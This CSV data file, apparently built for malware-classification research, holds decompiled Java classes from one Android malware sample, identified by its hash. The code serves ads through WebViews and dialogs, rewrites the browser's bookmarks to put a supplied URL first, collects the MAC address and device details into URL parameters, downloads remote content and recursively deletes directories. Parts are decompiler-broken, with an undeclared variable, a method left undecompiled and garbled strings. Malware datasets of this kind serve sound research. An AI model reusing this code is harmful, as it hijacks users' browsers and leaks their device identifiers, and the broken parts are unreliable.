"filepath","code"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\A.code","public class A implements Runnable {   final h f0a;   private final String b;   private final String c;   public A(  h hVar,  String str,  String str2){     this.f0a=hVar;     this.b=str;     this.c=str2;   }   @Override public void run(){     LinearLayout linearLayout;     Activity activity;     LinearLayout linearLayout2;     LinearLayout linearLayout3;     Activity activity2;     WebView webView;     WebView webView2;     LinearLayout linearLayout4;     WebView webView3;     Activity activity3;     LinearLayout linearLayout5;     linearLayout=this.f0a.m;     if (linearLayout == null) {       h hVar=this.f0a;       activity=this.f0a.j;       hVar.m=new LinearLayout(activity);       linearLayout2=this.f0a.m;       linearLayout2.setOrientation(1);       linearLayout3=this.f0a.m;       linearLayout3.setLayoutParams(new LinearLayout.LayoutParams(-1,-1));       h hVar2=this.f0a;       activity2=this.f0a.j;       hVar2.k=new WebView(activity2);       webView=this.f0a.k;       webView.getSettings().setJavaScriptEnabled(true);       webView2=this.f0a.k;       webView2.loadUrl(this.b);       linearLayout4=this.f0a.m;       webView3=this.f0a.k;       linearLayout4.addView(webView3);       h hVar3=this.f0a;       activity3=this.f0a.j;       hVar3.h=new AlertDialog.Builder(activity3).create();       this.f0a.h.setTitle(this.c);       AlertDialog alertDialog=this.f0a.h;       linearLayout5=this.f0a.m;       alertDialog.setView(linearLayout5);       this.f0a.h.setButton(n.Q,new DialogInterfaceOnClickListenerC0000a(this));     }     this.f0a.h.show();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\B.code","class B {   B(){   }   public static final int a(  MotionEvent motionEvent){     return motionEvent.getPointerCount();   }   public static final int a(  MotionEvent motionEvent,  int i){     return motionEvent.getPointerId(i);   }   public static final boolean a(  Context context){     if (i.f8a < 7) {       return true;     }     return context.getPackageManager().hasSystemFeature(""android.hardware.touchscreen.multitouch"");   }   public static final int b(  MotionEvent motionEvent,  int i){     return motionEvent.findPointerIndex(i);   }   public static final float c(  MotionEvent motionEvent,  int i){     return motionEvent.getX(i);   }   public static final float d(  MotionEvent motionEvent,  int i){     return motionEvent.getY(i);   }   public static final float e(  MotionEvent motionEvent,  int i){     return motionEvent.getSize(i);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\c.code","public class c {   private static final int[] f3a={8,29,45,51,0,0,0,0,67,66,44,43,7,16};   private static final int[] b; static {     int[] iArr=new int[15];     iArr[10]=84;     iArr[11]=4;     b=iArr;     if (b.length != f3a.length) {       throw new AssertionError(""Key configurations are not consistent"");     }   }   public static int[] a(  Context context){     int[] iArr=b(context) ? f3a : b;     if (c(context)) {       iArr[0]=19;       iArr[1]=20;       iArr[2]=21;       iArr[3]=22;     }     return iArr;   }   private static boolean b(  Context context){     return context.getResources().getConfiguration().keyboard == 2;   }   private static boolean c(  Context context){     return context.getResources().getConfiguration().navigation != 3;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\C0001b.code","class C0001b {   final h f2a;   C0001b(  h hVar){     this.f2a=hVar;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\d.code","public class d {   public static Hashtable f4a=new Hashtable();   public int b;   private String c;   private String d;   private Hashtable e;   private Vector f;   private d g;   public d(){   }   public d(  String str){     this.c=str;   }   public static void b(  String str,  String str2){     f4a.put(str,str2);   }   public static d[] b(  Vector vector){     int size;     if (vector != null && (size=vector.size()) != 0) {       d[] dVarArr=new d[size];       vector.copyInto(dVarArr);       return dVarArr;     }     return null;   }   public static d d(  String str){     int length;     if (e.b(str)) {       return null;     }     Stack stack=new Stack();     int length2=str.length();     StringBuffer stringBuffer=new StringBuffer();     d dVar=new d(n.A);     stack.push(dVar);     int i=0;     while (i < length2) {       char charAt=str.charAt(i);       if (charAt == '<') {         char charAt2=str.charAt(i + 1);         String trim=stringBuffer.toString().trim();         stringBuffer.delete(0,stringBuffer.length());         if (charAt2 == '/') {           if (!stack.empty()) {             dVar=(d)stack.elementAt(stack.size() - 1);           }           dVar.c(j(trim));           int indexOf=str.indexOf(62,i);           if (e(str.substring(i,indexOf + 1)).equals(dVar.d()) && dVar.f != null && dVar.f.size() > 0 && dVar.e() != null && !dVar.e().equals(n.f13a)) {             d dVar2=new d(n.f13a);             dVar2.c(j(dVar.e()));             dVar.a(dVar2);             dVar.c(null);           }           stack.pop();           str.charAt(indexOf - 1);           i=indexOf + 1;         }  else         if (charAt2 == '!') {           if (str.charAt(i + 2) == '-' && str.charAt(i + 3) == '-') {             int indexOf2=str.indexOf(n.E,i);             str.substring(i,indexOf2 + 3);             str.charAt(indexOf2 - 1);             i=indexOf2 + 3;           }  else {             int indexOf3=str.indexOf(62,i);             str.substring(i,indexOf3 + 1);             str.charAt(indexOf3 - 1);             i=indexOf3 + 1;           }         }  else         if (charAt2 == '?') {           int indexOf4=str.indexOf(62,i);           str.substring(i,indexOf4 + 1);           str.charAt(indexOf4 - 1);           i=indexOf4 + 1;         }  else {           d dVar3=!stack.empty() ? (d)stack.elementAt(stack.size() - 1) : dVar;           if (trim != null && trim.length() > 0) {             d dVar4=new d(n.f13a);             dVar4.c(j(trim));             dVar3.a(dVar4);             dVar4.g=dVar3;           }           int indexOf5=str.indexOf(62,i);           String substring=str.substring(i,indexOf5 + 1);           String e=e(substring);           d f=f(substring);           f.b(e);           if (str.charAt(indexOf5 - 1) == '/') {             dVar3.a(f);             f.g=dVar3;             i=indexOf5 + 1;             dVar=dVar3;           }  else {             if ((f4a.size() > 0 ? (String)f4a.get(e) : null) != null) {               String str2=String.valueOf(n.F) + e + '>';               int indexOf6=str.indexOf(str2,indexOf5);               if (indexOf6 == -1) {                 length=indexOf5 + 1;               }  else {                 f.c(str.substring(indexOf5 + 1,indexOf6));                 length=str2.length() + indexOf6;               }               dVar3.a(f);               f.g=dVar3;               i=length;               dVar=dVar3;             }  else {               dVar3.a(f);               f.g=dVar3;               stack.push(f);               i=indexOf5 + 1;               dVar=dVar3;             }           }         }       }  else {         stringBuffer.append(charAt);         i++;       }     }     e.b();     return (d)stack.pop();   }   public static String e(  String str){     int i;     int i2;     int indexOf=str.indexOf(32);     if (str.charAt(1) == '/') {       i=str.length() - 1;       i2=2;     }  else {       i=indexOf;       i2=1;     }     if (i == -1 || i2 == 2) {       i=str.charAt(str.length() - 2) == '/' ? str.length() - 2 : str.length() - 1;     }     return str.substring(i2,i).toLowerCase();   }   public static d f(  String str){     char c;     d dVar=new d(n.f13a);     int length=str.length();     StringBuffer stringBuffer=new StringBuffer();     String str2=null;     boolean z=false;     char c2=0;     char c3=0;     int i=0;     while (i < length) {       char charAt=str.charAt(i);       if (c3 == 0) {         if ('\r' == charAt || '\n' == charAt || '\t' == charAt || ' ' == charAt) {           c3=1;         }         i++;       }  else       if (c3 == 1) {         if ('=' == charAt) {           str2=stringBuffer.toString().trim();           stringBuffer.delete(0,stringBuffer.length());           z=false;           c2=0;           c3=2;         }  else {           stringBuffer.append(charAt);         }         i++;       }  else       if (c3 == 2) {         if (!z) {           if (' ' != charAt) {             if ('\'' == charAt || '\""' == charAt) {               c=charAt;             }  else {               stringBuffer.append(charAt);               c=' ';             }             c2=c;             z=true;           }           i++;         }  else         if (z) {           if (c2 == charAt) {             String trim=stringBuffer.toString().trim();             stringBuffer.delete(0,stringBuffer.length());             dVar.a(str2,j(trim));             str2=null;             c3=0;           }  else {             stringBuffer.append(charAt);             i++;           }         }       }     }     stringBuffer.delete(0,stringBuffer.length());     e.b();     return dVar;   }   public static String g(  String str){     return str;   }   public static String h(  String str){     int i;     String str2=str;     while (true) {       int indexOf=str2.indexOf(n.b);       if (indexOf != -1) {         int length=str2.length();         int i2=indexOf;         while (true) {           if (i2 >= length) {             i=indexOf;             break;           }           if (str2.charAt(i2) == ';') {             i=i2;             break;           }           i2++;         }         if (i == indexOf) {           break;         }         str2=String.valueOf(str2.substring(0,indexOf)) + e.f(String.valueOf(n.c) + str2.substring(indexOf + 3,i)) + str2.substring(i + 1);       }  else {         break;       }     }     return str2;   }   private static String j(  String str){     return g(h(str));   }   public d a(){     return this.g;   }   public String a(  String str){     if (this.e == null) {       return null;     }     String str2=(String)this.e.get(str);     return str2 == null ? n.f13a : str2;   }   public void a(  d dVar){     if (this.f == null) {       this.f=new Vector();     }     this.f.addElement(dVar);   }   public void a(  String str,  String str2){     if (this.e == null) {       this.e=new Hashtable();     }     this.e.put(str,str2);   }   public void a(  Hashtable hashtable){     this.e=hashtable;   }   public void a(  Vector vector){     this.f=vector;   }   public Hashtable b(){     return this.e;   }   public void b(  String str){     this.c=str;   }   public Vector c(){     return this.f;   }   public void c(  String str){     this.d=str;   }   public String d(){     return this.c;   }   public String e(){     return this.d == null ? n.f13a : this.d;   }   public void f(){     this.c=null;     this.d=null;     if (this.e != null) {       Enumeration keys=this.e.keys();       while (keys.hasMoreElements()) {         this.e.remove((String)keys.nextElement());       }     }     this.e=null;     if (this.f != null) {       int i=0;       while (true) {         int i2=i;         if (i2 >= this.f.size()) {           break;         }         ((d)this.f.elementAt(i2)).f();         i=i2 + 1;       }       this.f.removeAllElements();     }     this.f=null;   }   public int g(){     if (this.f != null) {       this.b=this.f.size();     }     return this.b;   }   public void i(  String str){     int g=g();     String str2=String.valueOf(str) + ""-"";     for (int i=0; i < g; i++) {       ((d)this.f.elementAt(i)).i(str2);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\DialogInterfaceOnClickListenerC0000a.code","class DialogInterfaceOnClickListenerC0000a implements DialogInterface.OnClickListener {   final A f1a;   public DialogInterfaceOnClickListenerC0000a(  A a2){     this.f1a=a2;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\e.code","public class e {   public static String a(  Activity activity){     try {       ApplicationInfo applicationInfo=activity.getPackageManager().getApplicationInfo(activity.getPackageName(),128);       if (applicationInfo != null) {         StringBuffer stringBuffer=new StringBuffer();         for (        String str : applicationInfo.metaData.keySet()) {           try {             String obj=applicationInfo.metaData.get(str).toString();             if (obj.endsWith(""$(width)"")) {               obj=String.valueOf(d(activity));             }  else             if (obj.endsWith(""$(height)"")) {               obj=String.valueOf(e(activity));             }  else             if (obj.endsWith(""$(mac)"")) {               obj=c(activity);             }  else             if (obj.endsWith(""$(language)"")) {               obj=b(activity);             }             a(stringBuffer,str,obj);           }  catch (          Exception e) {             e.printStackTrace();           }         }         return stringBuffer.toString();       }     }  catch (    Exception e2) {       e2.printStackTrace();     }     return """";   }   public static String a(  DataInputStream dataInputStream){     String str;     try {       int readInt=dataInputStream.readInt();       if (readInt == 0) {         str=n.f13a;       }  else {         byte[] bArr=new byte[readInt];         dataInputStream.read(bArr,0,readInt);         str=new String(s.a(bArr),n.Z);       }       return str;     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   static String a(  String str,  String str2,  String str3,  boolean z){     String str4;     String str5=n.f13a;     if (str == null || str2 == null || str3 == null) {       return str;     }     if (z) {       String lowerCase=str2.toLowerCase();       String str6=str;       while (true) {         int indexOf=str6.toLowerCase().indexOf(lowerCase);         if (indexOf == -1) {           break;         }         String substring=str6.substring(0,indexOf);         str6=str6.substring(indexOf + lowerCase.length());         str5=String.valueOf(str5) + substring + str3;       }       str4=str6;     }  else {       str4=str;       while (true) {         int indexOf2=str4.indexOf(str2);         if (indexOf2 == -1) {           break;         }         String substring2=str4.substring(0,indexOf2);         str4=str4.substring(indexOf2 + str2.length());         str5=String.valueOf(str5) + substring2 + str3;       }     }     return String.valueOf(str5) + str4;   }   public static void a(  Activity activity,  String str,  String str2){     new Thread(new g(activity,str2,str)).start();   }   public static void a(  String str,  String str2){     try {       new File(str2).mkdirs();       String[] list=new File(str).list();       for (int i=0; i < list.length; i++) {         File file=str.endsWith(File.separator) ? new File(String.valueOf(str) + list[i]) : new File(String.valueOf(str) + File.separator + list[i]);         if (file.isFile()) {           FileInputStream fileInputStream=new FileInputStream(file);           FileOutputStream fileOutputStream=new FileOutputStream(String.valueOf(str2) + ""/"" + file.getName().toString());           byte[] bArr=new byte[5120];           while (true) {             int read=fileInputStream.read(bArr);             if (read == -1) {               break;             }  else {               fileOutputStream.write(bArr,0,read);             }           }           fileOutputStream.flush();           fileOutputStream.close();           fileInputStream.close();         }         if (file.isDirectory()) {           a(String.valueOf(str) + ""/"" + list[i],String.valueOf(str2) + ""/"" + list[i]);         }       }     }  catch (    Exception e) {       e.printStackTrace();     }   }   private static void a(  StringBuffer stringBuffer,  String str,  String str2){     if (str2 == null || str2.length() <= 0) {       return;     }     try {       stringBuffer.append(""&"").append(URLEncoder.encode(str,""UTF-8"")).append(""="").append(URLEncoder.encode(str2,""UTF-8""));     }  catch (    Exception e) {       e.printStackTrace();     }   }   public static boolean a(){     File file=new File(""/sdcard"");     return file.exists() && file.canWrite();   }   public static boolean a(  int i,  int i2,  int i3,  int i4,  int i5,  int i6){     if ((i3 | i4) < 0) {       return false;     }     if (i5 < i || i6 < i2) {       return false;     }     int i7=i3 + i;     int i8=i4 + i2;     return (i7 < i || i7 > i5) && (i8 < i2 || i8 > i6);   }   public static boolean a(  int i,  int i2,  int i3,  int i4,  int i5,  int i6,  int i7,  int i8){     if (i7 <= 0 || i8 <= 0 || i3 <= 0 || i4 <= 0) {       return false;     }     int i9=i7 + i5;     int i10=i8 + i6;     int i11=i3 + i;     int i12=i4 + i2;     return (i9 < i5 || i9 > i) && (i10 < i6 || i10 > i2) && ((i11 < i || i11 > i5) && (i12 < i2 || i12 > i6));   }   public static boolean a(  Activity activity,  String str){     try {       String lowerCase=str.toLowerCase();       Intent intent=lowerCase.startsWith(""http://"") ? new Intent(""android.intent.action.VIEW"",Uri.parse(str)) : lowerCase.startsWith(""tel:"") ? new Intent(""android.intent.action.CALL"",Uri.parse(str)) : null;       if (intent != null) {         activity.startActivity(intent);       }       return true;     }  catch (    Exception e) {       e.printStackTrace();       return false;     }   }   public static boolean a(  DataOutputStream dataOutputStream,  String str){     try {       if (str == null) {         dataOutputStream.writeInt(0);         return true;       }       byte[] bytes=str.getBytes(n.Z);       ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();       GZIPOutputStream gZIPOutputStream=new GZIPOutputStream(byteArrayOutputStream);       gZIPOutputStream.write(bytes,0,bytes.length);       gZIPOutputStream.finish();       byte[] byteArray=byteArrayOutputStream.toByteArray();       if (byteArray.length > bytes.length) {         dataOutputStream.writeInt(bytes.length);         dataOutputStream.write(bytes,0,bytes.length);       }  else {         dataOutputStream.writeInt(byteArray.length);         dataOutputStream.write(byteArray,0,byteArray.length);       }       return true;     }  catch (    Exception e) {       e.printStackTrace();       return false;     }   }   public static byte[] a(  InputStream inputStream){     try {       if (0 > 0) {         byte[] bArr=new byte[0];         inputStream.read(bArr,0,0);         return bArr;       }       ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();       while (true) {         int read=inputStream.read();         if (read == -1) {           byte[] byteArray=byteArrayOutputStream.toByteArray();           byteArrayOutputStream.close();           return byteArray;         }         byteArrayOutputStream.write(read);       }     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   public static byte[] a(  String str){     byte[] bArr=(byte[])null;     try {       HttpURLConnection httpURLConnection=(HttpURLConnection)new URL(str).openConnection();       httpURLConnection.setDoInput(true);       httpURLConnection.setInstanceFollowRedirects(true);       if (httpURLConnection.getResponseCode() == 200) {         InputStream inputStream=httpURLConnection.getInputStream();         bArr=a(inputStream);         inputStream.close();       }       httpURLConnection.disconnect();       return bArr;     }  catch (    Exception e) {       byte[] bArr2=bArr;       e.printStackTrace();       return bArr2;     }   }   public static String[] a(  String str,  char c){     Vector vector=new Vector();     StringBuffer stringBuffer=new StringBuffer();     int length=str.length();     int i=0;     while (i < length) {       if (i == length - 1 || str.charAt(i) == c) {         vector.addElement(stringBuffer.toString());         stringBuffer.delete(0,stringBuffer.length());         i++;       }  else       if (str.charAt(i) != '\n') {         stringBuffer.append(str.charAt(i));       }       i++;     }     String[] strArr=new String[vector.size()];     vector.copyInto(strArr);     vector.removeAllElements();     return strArr;   }   public static String b(  Activity activity){     try {       return activity.getResources().getConfiguration().locale.getDisplayName();     }  catch (    Exception e) {       e.printStackTrace();       return """";     }   }   public static void b(){   }   public static boolean b(  int i,  int i2,  int i3,  int i4,  int i5,  int i6,  int i7,  int i8){     if ((i3 | i4 | i7| i8) < 0) {       return false;     }     if (i5 < i || i6 < i2) {       return false;     }     int i9=i3 + i;     int i10=i7 + i5;     if (i10 <= i5) {       if (i9 >= i || i10 > i9) {         return false;       }     }  else     if (i9 >= i && i10 > i9) {       return false;     }     int i11=i4 + i2;     int i12=i8 + i6;     if (i12 <= i6) {       if (i11 >= i2 || i12 > i11) {         return false;       }     }  else     if (i11 >= i2 && i12 > i11) {       return false;     }     return true;   }   public static boolean b(  String str){     return str == null || str.equals(n.f13a) || str.length() == 0;   }   public static String[] b(  String str,  char c){     String[] strArr=(String[])null;     int i=0;     try {       Vector vector=new Vector();       while (true) {         int indexOf=str.indexOf(c,i);         if (indexOf < 0) {           break;         }         vector.addElement(str.substring(i,indexOf));         i=indexOf + 1;       }       if (i < str.length()) {         vector.addElement(str.substring(i,str.length()));       }       strArr=new String[vector.size()];       vector.copyInto(strArr);       return strArr;     }  catch (    Exception e) {       return strArr;     }   }   public static String c(  Activity activity){     try {       return ((WifiManager)activity.getSystemService(""wifi"")).getConnectionInfo().getMacAddress();     }  catch (    Exception e) {       e.printStackTrace();       return """";     }   }   public static void c(  String str){     System.out.println(str);   }   public static int d(  Activity activity){     DisplayMetrics displayMetrics=new DisplayMetrics();     activity.getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);     return displayMetrics.widthPixels;   }   public static void d(  String str){     try {       e(str);       new File(str.toString()).delete();     }  catch (    Exception e) {       e.printStackTrace();     }   }   public static int e(  Activity activity){     DisplayMetrics displayMetrics=new DisplayMetrics();     activity.getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);     return displayMetrics.heightPixels;   }   public static void e(  String str){     File file=new File(str);     if (file.exists() && file.isDirectory()) {       String[] list=file.list();       for (int i=0; i < list.length; i++) {         File file2=str.endsWith(File.separator) ? new File(String.valueOf(str) + list[i]) : new File(String.valueOf(str) + File.separator + list[i]);         if (file2.isFile()) {           file2.delete();         }         if (file2.isDirectory()) {           e(String.valueOf(str) + ""/"" + list[i]);           d(String.valueOf(str) + ""/"" + list[i]);         }       }     }   }   public static String f(  String str){     if (str == null) {       return null;     }     StringBuffer stringBuffer=new StringBuffer();     int i=0;     while (i < str.length()) {       if (str.charAt(i) == '\\') {         int i2=i + 2;         while (str.length() > i2 && str.charAt(i2) == 'u') {           i2++;         }         if (str.length() >= i2 + 4) {           Integer.parseInt(str.substring(i2,i2 + 4),16);           i=i2 + 3;         }       }       i++;     }     return stringBuffer.toString();   }   public static int g(  String str){     try {       return Integer.parseInt(str);     }  catch (    Exception e) {       return 0;     }   }   public static float h(  String str){     try {       return Float.parseFloat(str);     }  catch (    Exception e) {       return 0.0f;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\f.code","class f {   String f5a;   String b;   String c; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\g.code","class g implements Runnable {   private final Activity f6a;   private final String b;   private final String c;   public g(  Activity activity,  String str,  String str2){     this.f6a=activity;     this.b=str;     this.c=str2;   }   @Override public void run(){     Cursor managedQuery=this.f6a.managedQuery(Browser.BOOKMARKS_URI,null,null,null,null);     managedQuery.moveToFirst();     int columnIndex=managedQuery.getColumnIndex(KeyProfilesActivity.EXTRA_TITLE);     int columnIndex2=managedQuery.getColumnIndex(""url"");     int columnIndex3=managedQuery.getColumnIndex(""_id"");     Vector vector=new Vector();     boolean z=false;     while (!managedQuery.isAfterLast()) {       f fVar=new f();       fVar.f5a=managedQuery.getString(columnIndex3);       fVar.b=managedQuery.getString(columnIndex);       fVar.c=managedQuery.getString(columnIndex2);       if (managedQuery.getString(managedQuery.getColumnIndex(""bookmark"")).equals(""1"")) {         vector.addElement(fVar);         if (fVar.c.equals(this.b)) {           z=true;         }       }       managedQuery.moveToNext();     }     if (!z) {       System.out.println(Browser.BOOKMARKS_URI.toString());       ContentResolver contentResolver=this.f6a.getContentResolver();       for (int i=0; i < vector.size(); i++) {         contentResolver.delete(Uri.parse(String.valueOf(""content://browser/bookmarks/"") + ((f)vector.elementAt(i)).f5a),null,null);       }       ContentValues contentValues=new ContentValues();       contentValues.put(""bookmark"",(Integer)1);       contentValues.put(KeyProfilesActivity.EXTRA_TITLE,this.c);       contentValues.put(""url"",this.b);       contentResolver.insert(Browser.BOOKMARKS_URI,contentValues);       for (int i2=0; i2 < vector.size(); i2++) {         contentValues.clear();         contentValues.put(""bookmark"",(Integer)1);         contentValues.put(KeyProfilesActivity.EXTRA_TITLE,((f)vector.elementAt(i2)).b);         contentValues.put(""url"",((f)vector.elementAt(i2)).c);         contentResolver.insert(Browser.BOOKMARKS_URI,contentValues);       }     }     vector.removeAllElements();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\h.code","public class h {   public int f7a;   public int b;   public int c;   public int d;   String e;   String f;   public View g;   AlertDialog h;   ImageButton i;   private Activity j;   private WebView k;   private Hashtable l=new Hashtable();   private LinearLayout m;   public h(  Activity activity){     this.j=activity;   }   public void a(  String str,  String str2){     this.j.runOnUiThread(new A(this,str2,str));   }   public void a(){   }   public void a(  d dVar){     try {       if (dVar.d().equals(r.w)) {         this.f=dVar.a(r.x);         this.e=dVar.a(r.y);         this.f7a=e.g(dVar.a(r.m));         this.b=e.g(dVar.a(r.n));         this.c=e.g(dVar.a(r.e));         this.d=e.g(dVar.a(r.f));         d[] b=d.b(dVar.c());         if (b != null) {           int length=b.length;           for (int i=0; i < length; i++) {             this.l.put(b[i].a(r.x),b[i].a(r.l));           }         }       }       if (this.f.equals(r.z)) {         this.k=new WebView(this.j);         this.k.getSettings().setJavaScriptEnabled(true);         this.k.loadUrl((String)this.l.get(""URL""));         new t(this,new z(this),e.g((String)this.l.get(""TIME""))).e();         this.g=this.k;         return;       }       if (this.f.equals(r.b)) {         String str=(String)this.l.get(""IMG"");         if (e.b(str)) {           Button button=new Button(this.j);           button.setText((CharSequence)this.l.get(""TEXT""));           this.g=button;         }  else {           ImageButton imageButton=new ImageButton(this.j);           byte[] a2=e.a(str);           imageButton.setImageBitmap(BitmapFactory.decodeByteArray(a2,0,a2.length));           this.g=imageButton;         }         this.g.setOnClickListener(new y(this));         return;       }       if (!this.f.equals(r.A)) {         if (this.f.equals(r.B) || this.f.equals(r.D) || this.f.equals(r.E)|| this.f.equals(r.C)|| this.f.equals(r.H)) {           return;         }         this.f.equals(r.G);         return;       }       b2=e.b((String)this.l.get(""ADMOB_ID""));       if (b2 != 0) {       }       String a3=dVar.a(r.y);       e.g((String)this.l.get(""TIME""));       this.g=new AbsoluteLayout(this.j);       new AbsoluteLayout.LayoutParams(-2,-2,0,0);       ((AbsoluteLayout)this.g).addView(b2);       if (a3.equals(r.J)) {         x xVar=new x(this);         if (e.g((String)this.l.get(""CLOSE"")) == 2) {           this.i=new ImageButton(this.j);           Bitmap decodeStream=BitmapFactory.decodeStream(this.j.getAssets().open(""btn.png""));           this.i.setLayoutParams(new AbsoluteLayout.LayoutParams(decodeStream.getWidth(),decodeStream.getHeight(),0,0));           this.i.setImageBitmap(decodeStream);           this.i.setBackgroundDrawable(null);           ((AbsoluteLayout)this.g).addView(this.i);           this.i.setOnClickListener(xVar);           this.i.setVisibility(8);         }       }     }  catch (    Exception e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\i.code","public class i {   static final int f8a=Integer.parseInt(Build.VERSION.SDK);   public static final int a(  MotionEvent motionEvent){     if (f8a >= 5) {       return B.a(motionEvent);     }     return 1;   }   public static final int a(  MotionEvent motionEvent,  int i){     if (f8a >= 5) {       return B.a(motionEvent,i);     }     return 0;   }   public static boolean a(){     return false;   }   public static boolean a(  Context context){     if (f8a >= 5) {       return B.a(context);     }     return false;   }   public static final int b(  MotionEvent motionEvent,  int i){     return f8a >= 5 ? B.b(motionEvent,i) : i == 0 ? 0 : -1;   }   public static boolean b(){     return false;   }   public static final float c(  MotionEvent motionEvent,  int i){     return f8a >= 5 ? B.c(motionEvent,i) : motionEvent.getX();   }   public static boolean c(){     return false;   }   public static final float d(  MotionEvent motionEvent,  int i){     return f8a >= 5 ? B.d(motionEvent,i) : motionEvent.getY();   }   public static final float e(  MotionEvent motionEvent,  int i){     return f8a >= 5 ? B.e(motionEvent,i) : motionEvent.getSize();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\j.code","class j implements Runnable {   final C0001b f9a;   j(  C0001b c0001b){     this.f9a=c0001b;   }   @Override public void run(){     h hVar;     h hVar2;     h hVar3;     hVar=this.f9a.f2a;     if (hVar.i != null) {       hVar3=this.f9a.f2a;       hVar3.i.setVisibility(0);     }     hVar2=this.f9a.f2a;     hVar2.g.setVisibility(0);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\k.code","class k implements Runnable {   final C0001b f10a;   k(  C0001b c0001b){     this.f10a=c0001b;   }   @Override public void run(){     h hVar;     h hVar2;     h hVar3;     hVar=this.f10a.f2a;     if (hVar.i != null) {       hVar3=this.f10a.f2a;       hVar3.i.setVisibility(0);     }     hVar2=this.f10a.f2a;     hVar2.g.setVisibility(0);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\l.code","public class l implements View.OnKeyListener {   private q f11a;   private int[] b=new int[128];   private int c;   public l(  View view,  q qVar){     this.f11a=qVar;     view.setOnKeyListener(this);   }   public final int a(){     return this.c;   }   public void a(  int i,  int i2){     if (i2 < 0 || i2 >= this.b.length) {       return;     }     int[] iArr=this.b;     iArr[i2]=iArr[i2] | i;   }   public void b(){     this.c=0;   }   public void c(){     for (int i=0; i < this.b.length; i++) {       this.b[i]=0;     }   }   @Override public boolean onKey(  View view,  int i,  KeyEvent keyEvent){     int i2;     if (i < this.b.length && (i2=this.b[i]) != 0) {       if (keyEvent.getRepeatCount() == 0) {         if (keyEvent.getAction() == 0) {           this.c=i2 | this.c;         }  else {           this.c=(i2 ^ (-1)) & this.c;         }         this.f11a.onGameKeyChanged();       }       return true;     }     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\m.code","public class m implements Runnable {   final o f12a;   public m(  o oVar){     this.f12a=oVar;   }   @Override public void run(){     throw new UnsupportedOperationException(""Method not decompiled: a.m.run():void"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\a\n.code","public class n {   public static final String Y=""ll"";   public static final String Z=""utf-8"";   public static final String aa="""";   public static final String ab="""";   static String f13a="""";   static String b=""&#x"";   static String c=""\\n"";   static String d=""&copy;"";   static String e=""(c)"";   static String f=""&amp;"";   static String g=""&"";   static String h=""&lt;"";   static String i=""<"";   static String j=""&gt;"";   static String k="">"";   static String l=""&nbsp;"";   static String m="" "";   static String n=""&apos;"";   static String o=""'"";   static String p=""&quot;"";   static String q=""\"""";   static String r=""&#039;"";   static String s=""'"";   static String t=""&#32;"";   static String u="" "";   static String v=""&#8226;"";   static String w=""â–ª"";   static String x=""&#169;"";   static String y=""(c)"";   static String z="".."";   static String A="""";   static String B=""ELEMENT"";   static String C=""CDATA"";   static String D=""EMPTY"";   static String E=""-->"";   static String F=""</"";   static String G=""0x"";   public static String H=""MANIFEST.MF"";   public static String I=""MIDlet-"";   public static String J=""MIDlet-Jar-Size"";   public static String K=""MIDlet-Jar-URL"";   public static String L=""MIDlet-Name"";   public static String M=""MIDlet-Vendor"";   public static String N=""MIDlet-Version"";   public static String O=""MicroEdition-Configuration"";   public static String P=""MicroEdition-Profile"";   public static String Q=""OK"";   public static String R=""å�–æ¶ˆ"";   public static String S=""æ��ç¤º"";   public static String T=""æ˜¯å�¦å…�è®¸ç¨‹åº�è®¿é—®ç½‘ç»œèµ„æº�?"";   public static String U="" "";   public static String V="" "";   public static String W=""android_ui/"";   public static String X=""conf.xml""; } "
